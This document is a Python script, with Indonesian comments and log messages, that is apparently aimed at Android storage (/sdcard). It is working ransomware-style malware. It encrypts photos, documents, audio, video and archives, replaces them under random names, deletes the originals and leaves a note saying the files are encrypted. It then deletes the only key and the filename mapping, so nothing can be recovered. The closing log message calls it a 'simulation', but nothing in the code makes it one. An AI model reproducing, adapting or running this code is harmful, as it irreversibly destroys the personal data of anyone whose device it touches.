#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import json
import random
import string
import logging
import shutil
from cryptography.fernet import Fernet
from concurrent.futures import ThreadPoolExecutor, as_completed

# KONFIGURASI
TARGET_DIR = "/sdcard"
EXTENSIONS = ['.mp3', '.jpg', '.jpeg', '.png', '.gif', '.txt', '.docx', '.pdf', '.mp4', '.zip']
NOTE_MESSAGE = "Hai, semua file Anda telah dienkripsi."
KEY_FILE = ".key"
MAP_FILE = ".map.json"
THREADS = 5

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def random_filename(extension, length=25):
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return name + extension

def generate_key():
    return Fernet.generate_key()

def save_key(key, key_path):
    with open(key_path, 'wb') as f:
        f.write(key)
    logging.info(f"Kunci disimpan di {key_path}")

def encrypt_file(filepath, cipher, mapping):
    try:
        # Baca isi file
        with open(filepath, 'rb') as f:
            data = f.read()
        
        # Enkripsi data
        encrypted_data = cipher.encrypt(data)
        
        # Tentukan nama baru acak
        dir_name = os.path.dirname(filepath)
        ext = os.path.splitext(filepath)[1]
        new_name = random_filename(ext)
        new_path = os.path.join(dir_name, new_name)
        
        # Tulis data terenkripsi
        with open(new_path, 'wb') as f:
            f.write(encrypted_data)
        
        # Hapus file asli
        os.remove(filepath)
        
        # Simpan mapping
        mapping[new_path] = filepath
        
        logging.info(f"Enkripsi: {filepath} -> {new_path}")
        return True
    except Exception as e:
        logging.error(f"Gagal enkripsi {filepath}: {e}")
        return False

def find_files(target_dir, extensions):
    files = []
    for root, dirs, filenames in os.walk(target_dir):
        for f in filenames:
            # Lewati file kunci dan mapping (jika ada)
            if f == KEY_FILE or f == MAP_FILE:
                continue
            if any(f.lower().endswith(ext.lower()) for ext in extensions):
                files.append(os.path.join(root, f))
    return files

def save_mapping(mapping, map_path):
    with open(map_path, 'w') as f:
        json.dump(mapping, f, indent=2)
    logging.info(f"Mapping disimpan di {map_path}")

def leave_note(target_dir, device_id):
    note_path = os.path.join(target_dir, "Pesan.txt")
    note_content = f"""
Hai, semua file Anda telah dienkripsi.
"""
    with open(note_path, 'w') as f:
        f.write(note_content)
    logging.info(f"Catatan ditinggalkan di {note_path}")

def delete_key_and_map(target_dir):
    key_path = os.path.join(target_dir, KEY_FILE)
    map_path = os.path.join(target_dir, MAP_FILE)
    
    deleted = True
    if os.path.exists(key_path):
        os.remove(key_path)
        logging.info(f"File kunci {key_path} dihapus.")
        deleted = True
    if os.path.exists(map_path):
        os.remove(map_path)
        logging.info(f"File mapping {map_path} dihapus.")
        deleted = True
    
    if not deleted:
        logging.warning("Tidak ada file kunci/mapping yang ditemukan untuk dihapus.")
    
    return deleted

def main():
    # Cek apakah direktori target ada
    if not os.path.isdir(TARGET_DIR):
        logging.error(f"Direktori target {TARGET_DIR} tidak ditemukan.")
        sys.exit(1)

    # Cek apakah sudah ada file kunci (mencegah enkripsi ulang)
    key_path = os.path.join(TARGET_DIR, KEY_FILE)
    if os.path.exists(key_path):
        logging.warning(f"File kunci sudah ada di {key_path}. Kemungkinan sudah pernah dienkripsi. Hentikan untuk keamanan.")
        sys.exit(1)

    # Generate kunci
    key = generate_key()
    save_key(key, key_path)

    # Inisialisasi cipher
    cipher = Fernet(key)

    # Cari file
    logging.info(f"Mencari file dengan ekstensi {EXTENSIONS} di {TARGET_DIR}...")
    files = find_files(TARGET_DIR, EXTENSIONS)
    logging.info(f"Ditemukan {len(files)} file.")

    if not files:
        logging.info("Tidak ada file untuk dienkripsi.")
        # Tetap hapus kunci jika sudah dibuat (agar bersih)
        if os.path.exists(key_path):
            os.remove(key_path)
        return

    # Mapping untuk pemulihan
    mapping = {}

    # Enkripsi dengan thread pool
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(encrypt_file, f, cipher, mapping): f for f in files}
        for future in as_completed(futures):
            future.result()  # Raise exception jika ada

    # Simpan mapping (sementara)
    map_path = os.path.join(TARGET_DIR, MAP_FILE)
    save_mapping(mapping, map_path)

    # Ambil device ID (untuk Android)
    device_id = os.popen('getprop ro.serialno').read().strip() or "UNKNOWN"
    leave_note(TARGET_DIR, device_id)

    # HAPUS KUNCI DAN MAPPING SETELAH SELESAI (TANPA KONFIRMASI)
    delete_key_and_map(TARGET_DIR)

    logging.info("Enkripsi selesai. File kunci dan mapping telah dihapus. Data Anda tidak dapat dipulihkan (simulasi).")

if __name__ == "__main__":
    main()